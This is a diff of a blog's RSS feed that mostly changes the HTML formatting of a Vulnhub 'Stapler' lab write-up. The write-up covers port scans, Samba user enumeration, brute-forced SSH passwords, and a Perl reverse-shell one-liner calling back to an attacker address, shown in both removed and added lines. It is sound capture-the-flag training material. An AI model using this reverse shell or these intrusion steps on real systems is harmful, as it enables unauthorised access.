@@ -6,15 +6,13 @@
 </description>
     <link>http://a.aronott.com/</link>
     <atom:link href="http://a.aronott.com/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Wed, 26 Jul 2017 21:06:57 -0600</pubDate>
-    <lastBuildDate>Wed, 26 Jul 2017 21:06:57 -0600</lastBuildDate>
-    <generator>Jekyll v3.0.1</generator>
+    <pubDate>Thu, 27 Jul 2017 16:28:09 -0600</pubDate>
+    <lastBuildDate>Thu, 27 Jul 2017 16:28:09 -0600</lastBuildDate>
+    <generator>Jekyll v3.5.1</generator>
     
       <item>
         <title>Stapler</title>
-        <description>&lt;h1 id=&quot;stapler&quot;&gt;Stapler&lt;/h1&gt;
-
-&lt;p&gt;Stapler is a boot-to-root vulnerable machine that was found on &lt;a href=&quot;https://www.vulnhub.com/entry/stapler-1,150/&quot;&gt;Vulnhub&lt;/a&gt;. The machine was not super difficult, however it does certainly reward enumeration. This is certainly not surprising given that the machine was created by g0tmi1k.&lt;/p&gt;
+        <description>&lt;p&gt;Stapler is a boot-to-root vulnerable machine that was found on &lt;a href=&quot;https://www.vulnhub.com/entry/stapler-1,150/&quot;&gt;Vulnhub&lt;/a&gt;. The machine was not super difficult, however it does certainly reward enumeration. This is certainly not surprising given that the machine was created by g0tmi1k.&lt;/p&gt;
 
 &lt;p&gt;This is by no means the only correct way to pass this machine and gain root access, it is just the way I found to do it.&lt;/p&gt;
 
@@ -22,8 +20,7 @@
 
 &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p- 192.168.1.116&lt;/code&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;
-ports open: PORT STATE SERVICE
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ports open: PORT STATE SERVICE
 21/tcp open ftp
 22/tcp open ssh
 53/tcp open domain
@@ -32,21 +29,22 @@ ports open: PORT STATE SERVICE
 666/tcp open doom
 3306/tcp open mysql
 12380/tcp open unknown
-&lt;/code&gt;
-This returns a list of open ports that can be used to further enumerate each service.&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;This returns a list of open ports that can be used to further enumerate each service.&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;Port 21:&lt;/strong&gt;&lt;/p&gt;
 
-&lt;p&gt;Connecting to FTP we are presented a message:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;
-220-
+&lt;p&gt;Connecting to FTP we are presented a message:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;220-
 220-|-----------------------------------------------------------------------------------------|
 220-| Harry, make sure to update the banner when you get a chance to show who has access here |
 220-|-----------------------------------------------------------------------------------------|
 220-
 220
-&lt;/code&gt;
-&lt;img src=&quot;/assets/images/stapler/image.png&quot; alt=&quot;img of ftp output&quot; /&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image.png&quot; alt=&quot;img of ftp output&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;We are able to login anonymously and find that there is a file available for download.&lt;/p&gt;
 
@@ -65,60 +63,61 @@ Elly, make sure you update the payload information. Leave it in your FTP account
 
 &lt;p&gt;When using ssh to connect to the box, we see another message:&lt;/p&gt;
 
-&lt;h2 id=&quot;section&quot;&gt;```&lt;/h2&gt;
-&lt;p&gt;~ Barry, don’t forget to put a message here ~
-—————————————————————–
-```
-using netcat, we can see that the ssh version is: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-----------------------------------------------------------------
+~ Barry, don't forget to put a message here ~
+-----------------------------------------------------------------
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;using netcat, we can see that the ssh version is: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;Port 139:&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;enum4linux reveals quite a bit of information for this server, including a list of valid users and 2 mount points.&lt;/p&gt;
 
-&lt;p&gt;```
-# enum4linux 192.168.1.116
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# enum4linux 192.168.1.116
 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jul 16 11:36:25 2017
 ==========================
 | Target Information     |
 ==========================
-Target ……….. 192.168.1.116
-RID Range …….. 500-550,1000-1050
-Username ……… ‘’
-Password ……… ‘’
-Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none&lt;/p&gt;
+Target ........... 192.168.1.116
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 
-&lt;p&gt;==========================================
+==========================================
 | Share Enumeration on 192.168.1.116     |
 ==========================================
-WARNING: The “syslog” option is deprecated
-Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]&lt;/p&gt;
+WARNING: The &quot;syslog&quot; option is deprecated
+Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
 
-&lt;p&gt;Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
+Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
 Sharename Type Comment
-——— —- ——-
+--------- ---- -------
 print$    Disk  Printer Drivers
 kathy     Disk  Fred, What are we doing here?
 tmp       Disk  All temporary files should be stored here
-IPC$      IPC   IPC Service (red server (Samba, Ubuntu))&lt;/p&gt;
+IPC$      IPC   IPC Service (red server (Samba, Ubuntu))
 
-&lt;p&gt;Server    Comment
-——— ——-
+
+Server    Comment
+--------- -------
 LINKSYS01751 Samba 3.0.28a
-RED        red server (Samba, Ubuntu)&lt;/p&gt;
+RED        red server (Samba, Ubuntu)
 
-&lt;p&gt;Workgroup  Master
-———  ——–
-WORKGROUP LINKSYS01751&lt;/p&gt;
+Workgroup  Master
+---------  --------
+WORKGROUP LINKSYS01751
 
-&lt;p&gt;[+] Attempting to map shares on 192.168.1.116
+[+] Attempting to map shares on 192.168.1.116
 //192.168.1.116/print$ Mapping: DENIED, Listing: N/A
 //192.168.1.116/kathy Mapping: OK, Listing: OK
 //192.168.1.116/tmp Mapping: OK, Listing: OK
-//192.168.1.116/IPC$ Mapping: OK Listing: DENIED&lt;/p&gt;
+//192.168.1.116/IPC$ Mapping: OK Listing: DENIED
 
-&lt;p&gt;…&lt;/p&gt;
+...
 
-&lt;p&gt;S-1-22-1-1000 Unix User\peter (Local User)
+S-1-22-1-1000 Unix User\peter (Local User)
 S-1-22-1-1001 Unix User\RNunemaker (Local User)
 S-1-22-1-1002 Unix User\ETollefson (Local User)
 S-1-22-1-1003 Unix User\DSwanger (Local User)
@@ -147,25 +146,30 @@ S-1-22-1-1026 Unix User\zoe (Local User)
 S-1-22-1-1027 Unix User\NATHAN (Local User)
 S-1-22-1-1028 Unix User\www (Local User)
 S-1-22-1-1029 Unix User\elly (Local User)
-```
-&lt;strong&gt;Port 666:&lt;/strong&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;Port 666:&lt;/strong&gt;
 Using netcat to connect to port 666 we see a bunch of gibberish.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image4.png&quot; alt=&quot;image of gibberish&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;If we capture this gibberish out to a file,
-&lt;img src=&quot;/assets/images/stapler/image5.png&quot; alt=&quot;image of gibberish&quot; /&gt;
-We see that it’s a zip file.&lt;/p&gt;
+&lt;p&gt;If we capture this gibberish out to a file.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image6.png&quot; alt=&quot;img message2.jpg&quot; /&gt;
-This contains an interesting file message2.jpg.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image5.png&quot; alt=&quot;image of gibberish&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We see that it’s a zip file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image6.png&quot; alt=&quot;img message2.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This contains an interesting file message2.jpg.&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;Port 3306:&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;I don’t have a valid username or password for mysql, but I was able to find the mysql version using netcat.&lt;/p&gt;
 
-&lt;p&gt;5.7.12-0ubuntu1
-&lt;img src=&quot;/assets/images/stapler/image7.png&quot; alt=&quot;img mysql version&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;5.7.12-0ubuntu1&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image7.png&quot; alt=&quot;img mysql version&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;Port 12380:&lt;/strong&gt;&lt;/p&gt;
 
@@ -212,13 +216,16 @@ This contains an interesting file message2.jpg.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image14.png&quot; alt=&quot;Bruteforce&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Now I have 3 accounts that I can use to ssh to the box.
-- JBare: cookie
-- MFrei: letmein
-- Drew: qwerty&lt;/p&gt;
+&lt;p&gt;Now I have 3 accounts that I can use to ssh to the box.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;JBare: cookie&lt;/li&gt;
+  &lt;li&gt;MFrei: letmein&lt;/li&gt;
+  &lt;li&gt;Drew: qwerty&lt;/li&gt;
+&lt;/ul&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image15.png&quot; alt=&quot;access through ssh&quot; /&gt;
-Using the password (cookie) from above I was able to ssh to the machine.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image15.png&quot; alt=&quot;access through ssh&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Using the password (cookie) from above I was able to ssh to the machine.&lt;/p&gt;
 
 &lt;p&gt;I then started with the enumeration steps on the box itself. https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&lt;/p&gt;
 
@@ -237,7 +244,7 @@ Using the password (cookie) from above I was able to ssh to the machine.&lt;/p&g
 
 &lt;p&gt;I added a reverse shell using perl to this script:&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;perl -e &#39;use Socket;$i=&quot;192.168.1.124&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))) {open(STDIN,&quot;&amp;gt;&amp;amp;S&quot;);open(STDOUT,&quot;&amp;gt;&amp;amp;S&quot;);open(STDERR,&quot;&amp;gt;&amp;amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;perl -e 'use Socket;$i=&quot;192.168.1.124&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))) {open(STDIN,&quot;&amp;gt;&amp;amp;S&quot;);open(STDOUT,&quot;&amp;gt;&amp;amp;S&quot;);open(STDERR,&quot;&amp;gt;&amp;amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image18.png&quot; alt=&quot;reverse shell in script&quot; /&gt;&lt;/p&gt;
 
